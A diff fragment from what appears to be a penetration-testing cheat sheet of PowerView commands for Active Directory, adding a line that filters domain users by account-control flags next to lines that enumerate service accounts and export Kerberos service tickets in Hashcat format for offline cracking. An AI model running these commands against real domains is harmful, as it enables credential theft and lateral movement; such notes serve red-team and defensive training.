@@ -36,6 +36,7 @@ PS> Test-AdminAccess -ComputerName TARGET_HOST
 PS> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 PS> Get-DomainUser cn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes # encryption scheme
 PS> Get-DomainUser -Identity cn | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\xxx.csv -NoTypeInformation
+PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*XXX*'} | select samaccountname,useraccountcontrol
 ```
 </div><div>
 
